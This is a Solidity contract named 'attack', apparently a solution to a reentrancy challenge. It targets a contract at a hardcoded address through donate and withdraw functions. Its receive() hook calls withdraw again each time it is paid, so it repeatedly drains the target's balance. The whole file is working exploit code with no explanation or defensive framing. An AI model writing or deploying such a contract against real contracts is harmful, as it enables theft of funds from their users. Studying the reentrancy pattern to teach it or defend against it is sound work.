// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrant{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract attack{

    uint public amt = 0.001 ether;
    IReentrant public immutable Rcontract;

    constructor() public{
        Rcontract = IReentrant(0xeE4726a203f996Ed5a9E9FeDA34B5D8371D71DF0);
    }

    function donate(address _to) public payable{
        Rcontract.donate{value: msg.value}(_to);
    }

    function withdrawAndAttack() public{
        Rcontract.withdraw(amt);
    }

    receive() external payable{
        withdrawAndAttack();
    }
}